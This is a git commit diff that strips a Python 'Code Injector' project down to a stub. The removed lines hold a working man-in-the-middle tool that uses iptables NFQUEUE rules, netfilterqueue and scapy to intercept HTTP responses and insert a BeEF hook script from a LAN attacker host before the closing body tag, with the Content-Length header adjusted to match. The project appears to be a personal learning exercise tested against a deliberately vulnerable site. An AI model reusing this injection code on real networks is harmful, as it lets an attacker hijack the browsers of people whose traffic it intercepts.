682c093e2144726e1102d0ea213308c2c7de9ed2
Vhackenstance <hackenstance@proton.me>
2026-06-06 05:52:45 -0500

    Deleted code for rebuild

--- README.md
+++ README.md
@@ -1,32 +1,20 @@
 <h3>CODE INJECTOR</h3>
 <p>
-This script does not work with HTTPS sites, which is pretty much every site now.  Even the few 
-sites left that are not HTTPS, such as bing.com, it will not work due to HSTS (HTTP Strict Transport Security)
-and Certificate Pinning.  I am building it as a scaffold, as with every project here, for when I implement onPath for HTTPS.
+HTTP only.  
 </p>
 <h4>Process - Locally</h4>
-<h4>1. Set the iptables rules</h4>
 <ol>
     <li>
-        Set IP Table rules <br/>
-        <b>sudo iptables -I INPUT -j NFQUEUE --queue-num 0 --queue-bypass
-            <br/>
-        sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0 --queue-bypass</b>
+        Set IP Table rules using set_iptables.py <br/>
     </li>
     <li>
-        Afterwards, clear the iptables
-        <br>
-        <b>sudo iptables --flush</b>
+        Afterwards, flush the iptables
     </li>
     <li>
         Check the tables have been flushed.<br/>
-        <b>sudo iptables -L</b><br/>
-        The chains, or table, of values should be empty.
+        <b>sudo iptables -L</b>
     </li>
 </ol>
-
-<h4>Setting the iptables can now be run by a script</h4>
-<h4>sudo python ./Utilities/set_iptables.py -s [True/False/Omit] -n [number/omit] -f [True/False/Omit]</h4>
 <ul>
     <li><b>-s</b>, --set, is setiptables, do you want to set iptables True or False
         <br/>
@@ -45,12 +33,8 @@ and Certificate Pinning.  I am building it as a scaffold, as with every project 
             Or, you can place of a value of False.
     </li>
 </ul>
-<h4>This code as it stands will not work with HTTPS</h4>
-<p>I am testing against the only http website I currently know.<br/>
-<b>http://testasp.vulnweb.com/Default.asp?</b><br/>
-</p>
-<h4>index.html file location</h4>
-<p>
+<p>I am testing against.<br/>
+<b>http://testasp.vulnweb.com/</b><br/>
 /var/www/htlm/index.html
 </p>
 
--- code_injector.py
+++ code_injector.py
@@ -1,44 +1,10 @@
 #!/usr/bin/env python3
+# Rebuild
 import netfilterqueue
-from scapy.layers.inet import IP, TCP
-from scapy.layers.dns import Raw
-from Utilities.utils import set_load
-import re
 
 def process_packet(packet):
-    # alert_code = "<script>alert('Hello World!')</script>"
-    beef_code = "<script src=\"http://192.168.1.72:3000/hook.js\" ></script>"
-    scapy_packet= IP(packet.get_payload())
-    if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
-        try:
-            load = scapy_packet[Raw].load.decode()
-            encoding_pattern = "Accept-Encoding:.*?\\r\\n"
-            content_length_pattern = "(?:Content-Length:\s)(\d*)"
-            if scapy_packet[TCP].dport == 80:
-                print("\n[+] HTTP Request:")
-                # Strip encoding to stop GZIP compression of HTML
-                load = re.sub(encoding_pattern, "", load)
+    print("\n[+] Hello World, this is Code Injector!")
 
-            elif scapy_packet[TCP].sport == 80:
-                print("\n[+] HTTP Response:\n")
-                # print(scapy_packet.show())
-                injection_code = beef_code
-                load = load.replace("</body>", injection_code + "</body>")
-                content_length_search = re.search(content_length_pattern, load)
-                if content_length_search and "text/html" in load:
-                    content_length = content_length_search.group(1)
-                    new_content_length = int(content_length) + len(injection_code)
-                    load = load.replace(content_length, str(new_content_length))
-
-            if load != scapy_packet[Raw].load:
-                new_packet = set_load(scapy_packet, load)   # Create a new packet with the modified load
-                packet.set_payload(bytes(new_packet))         # Set the new packet as the main packet
-        except UnicodeDecodeError:
-            pass
-    packet.accept()
-    return None
-
-print("\n[+] Hello World, this is Code Injector!")
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
 queue.run()
